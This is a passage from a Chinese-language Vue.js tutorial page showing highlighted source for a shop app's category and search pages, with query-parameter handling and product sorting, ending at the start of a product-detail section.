#9CDCFE">item</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">image</span><span style="color: #D4D4D4">?.</span><span style="color: #9CDCFE">external_url</span><span style="color: #D4D4D4">"</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">alt</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">""</span><span style="color: #D4D4D4"> /</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">p</span><span style="color: #808080">&gt;</span><span style="color: #D4D4D4">{{ </span><span style="color: #9CDCFE">item</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">name</span><span style="color: #D4D4D4"> }}</span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">p</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #808080">&lt;/</span><span style="color: #569CD6">template</span><span style="color: #808080">&gt;</span></span><span class="line"></span><span class="line"><span style="color: #808080">&lt;</span><span style="color: #569CD6">script</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #C586C0">import</span><span style="color: #D4D4D4"> { </span><span style="color: #9CDCFE">getCategoryData</span><span style="color: #D4D4D4"> } </span><span style="color: #C586C0">from</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">"@/api/category"</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #C586C0">export</span><span style="color: #D4D4D4"> </span><span style="color: #C586C0">default</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">name:</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">"CategoryPage"</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #DCDCAA">created</span><span style="color: #D4D4D4">() {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">getCategoryList</span><span style="color: #D4D4D4">();</span></span><span class="line"><span style="color: #D4D4D4">  },</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #DCDCAA">data</span><span style="color: #D4D4D4">() {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">activeKey:</span><span style="color: #D4D4D4"> </span><span style="color: #B5CEA8">0</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">list:</span><span style="color: #D4D4D4"> [],</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">activeIndex:</span><span style="color: #D4D4D4"> </span><span style="color: #B5CEA8">0</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">    };</span></span><span class="line"><span style="color: #D4D4D4">  },</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">methods:</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">async</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">getCategoryList</span><span style="color: #D4D4D4">() {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">data</span><span style="color: #D4D4D4">: { </span><span style="color: #4FC1FF">list</span><span style="color: #D4D4D4"> },</span></span><span class="line"><span style="color: #D4D4D4">      } = </span><span style="color: #C586C0">await</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">getCategoryData</span><span style="color: #D4D4D4">();</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">list</span><span style="color: #D4D4D4"> = </span><span style="color: #9CDCFE">list</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #6A9955">// console.log(this.list)</span></span><span class="line"><span style="color: #D4D4D4">    },</span></span><span class="line"><span style="color: #D4D4D4">  },</span></span><span class="line"><span style="color: #D4D4D4">};</span></span><span class="line"><span style="color: #808080">&lt;/</span><span style="color: #569CD6">script</span><span style="color: #808080">&gt;</span></span><span class="line"></span><span class="line"><span style="color: #808080">&lt;</span><span style="color: #569CD6">style</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">lang</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"less"</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">scoped</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #6A9955">// 主题 padding</span></span><span class="line"><span style="color: #D7BA7D">.category</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">padding-top</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">100px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">padding-bottom</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">50px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">height</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">100vh</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #D7BA7D">.list-box</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">height</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">100%</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">display</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">flex</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #D7BA7D">.left</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">width</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">85px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">height</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">100%</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">background-color</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">#f3f3f3</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">overflow</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">auto</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #569CD6">van-sidebar-item</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">display</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">block</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">height</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">45px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">line-height</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">45px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">text-align</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">center</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">color</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">#444444</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">font-size</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">12px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #D7BA7D">&amp;.active</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #9CDCFE">color</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">#fb442f</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #9CDCFE">background-color</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">#fff</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">        }</span></span><span class="line"><span style="color: #D4D4D4">      }</span></span><span class="line"><span style="color: #D4D4D4">    }</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #D7BA7D">.right</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">flex</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">1</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">height</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">100%</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">background-color</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">#ffffff</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">display</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">flex</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">flex-wrap</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">wrap</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">justify-content</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">flex-start</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">align-content</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">flex-start</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">padding</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">10px</span><span style="color: #D4D4D4"> </span><span style="color: #B5CEA8">0</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">overflow</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">auto</span><span style="color: #D4D4D4">;</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #D7BA7D">.cate-goods</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">width</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">33.3%</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">margin-bottom</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">10px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #D7BA7D">img</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #9CDCFE">width</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">70px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #9CDCFE">height</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">70px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #9CDCFE">display</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">block</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #9CDCFE">margin</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">5px</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">auto</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">        }</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #D7BA7D">p</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #9CDCFE">text-align</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">center</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #9CDCFE">font-size</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">12px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">        }</span></span><span class="line"><span style="color: #D4D4D4">      }</span></span><span class="line"><span style="color: #D4D4D4">    }</span></span><span class="line"><span style="color: #D4D4D4">  }</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"></span><span class="line"><span style="color: #6A9955">// 导航条样式定制</span></span><span class="line"><span style="color: #D7BA7D">.van-nav-bar</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">z-index</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">999</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"></span><span class="line"><span style="color: #6A9955">// 搜索框样式定制</span></span><span class="line"><span style="color: #D7BA7D">.van-search</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">position</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">fixed</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">width</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">100%</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">top</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">46px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">z-index</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">999</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"><span style="color: #808080">&lt;/</span><span style="color: #569CD6">style</span><span style="color: #808080">&gt;</span></span></code></pre></div></div></figure><p>修改搜索页列表的查询参数</p><figure class="shiki js"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #808080">&lt;</span><span style="color: #569CD6">script</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">import GoodsItem from '@/components/GoodsItem.vue'</span></span><span class="line"><span style="color: #D4D4D4">import </span><span style="color: #569CD6">{</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">getProducts</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">}</span><span style="color: #D4D4D4"> from '@/api/product'</span></span><span class="line"><span style="color: #D4D4D4">export default </span><span style="color: #569CD6">{</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">name</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">'SearchIndex'</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">components</span><span style="color: #D4D4D4">: {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">GoodsItem</span></span><span class="line"><span style="color: #D4D4D4">  },</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">computed</span><span style="color: #D4D4D4">: {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #6A9955">// 从router的query中拿到查询参数</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #DCDCAA">querySearch</span><span style="color: #D4D4D4"> () {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #6A9955">// console.log(this.$route.query.search)</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #6A9955">// 如果查询参数不存在就返回一个空字符串</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">$route</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">query</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">search</span><span style="color: #D4D4D4"> || </span><span style="color: #CE9178">''</span></span><span class="line"><span style="color: #D4D4D4">    },</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #DCDCAA">queryCategory</span><span style="color: #D4D4D4"> () {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">$route</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">query</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">categoryId</span><span style="color: #D4D4D4"> || </span><span style="color: #CE9178">''</span></span><span class="line"><span style="color: #D4D4D4">    }</span></span><span class="line"><span style="color: #D4D4D4">  },</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">async</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">created</span><span style="color: #D4D4D4"> () {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #6A9955">// 获取商品列表数据</span></span><span class="line"><span style="color: #D4D4D4">    const </span><span style="color: #9CDCFE">res</span><span style="color: #D4D4D4"> = </span><span style="color: #C586C0">await</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">getProducts</span><span style="color: #D4D4D4">({</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">categoryId:</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">queryCategory</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">goodsName:</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">querySearch</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #6A9955">// page: this.page</span></span><span class="line"><span style="color: #D4D4D4">    })</span></span><span class="line"><span style="color: #D4D4D4">    this.</span><span style="color: #9CDCFE">productList</span><span style="color: #D4D4D4"> = </span><span style="color: #9CDCFE">res</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">data</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">list</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">data</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #6A9955">// console.log(res.data.list)</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #6A9955">// console.log(this.querySearch)</span></span><span class="line"><span style="color: #D4D4D4">  },</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #DCDCAA">data</span><span style="color: #D4D4D4"> () {</span></span><span class="line"><span style="color: #D4D4D4">    return {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #C8C8C8">currentSortType</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">'all'</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #C8C8C8">productList</span><span style="color: #D4D4D4">: [],</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #C8C8C8">page</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">1</span></span><span class="line"><span style="color: #D4D4D4">    }</span></span><span class="line"><span style="color: #D4D4D4">  },</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">methods</span><span style="color: #D4D4D4">: {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #6A9955">// 排序商品</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">async</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">sortGoods</span><span style="color: #D4D4D4"> (</span><span style="color: #9CDCFE">sortType</span><span style="color: #D4D4D4">) {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #6A9955">// console.log(sortType)</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">currentSortType</span><span style="color: #D4D4D4"> = </span><span style="color: #9CDCFE">sortType</span><span style="color: #D4D4D4"> </span><span style="color: #6A9955">// 更新当前选中的排序类型</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #4FC1FF">res</span><span style="color: #D4D4D4"> = </span><span style="color: #C586C0">await</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">getProducts</span><span style="color: #D4D4D4">({</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">categoryId:</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">queryCategory</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">goodsName:</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">querySearch</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">sortType:</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">sortType</span></span><span class="line"><span style="color: #D4D4D4">      })</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">productList</span><span style="color: #D4D4D4"> = </span><span style="color: #9CDCFE">res</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">data</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">list</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">data</span></span><span class="line"><span style="color: #D4D4D4">    }</span></span><span class="line"><span style="color: #D4D4D4">  }</span></span><span class="line"><span style="color: #569CD6">}</span></span><span class="line"><span style="color: #808080">&lt;/</span><span style="color: #569CD6">script</span><span style="color: #808080">&gt;</span></span></code></pre></div></div></figure><h2 id="商品详情页"><a class="markdownIt-Anchor" href="#商品详情页"></a> 商品详情页</h2><h3 id="静态结构"><a class="markdownIt-Anchor" href="#静态结构"></a> 静态结构</h3><figure class="shiki vue"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span 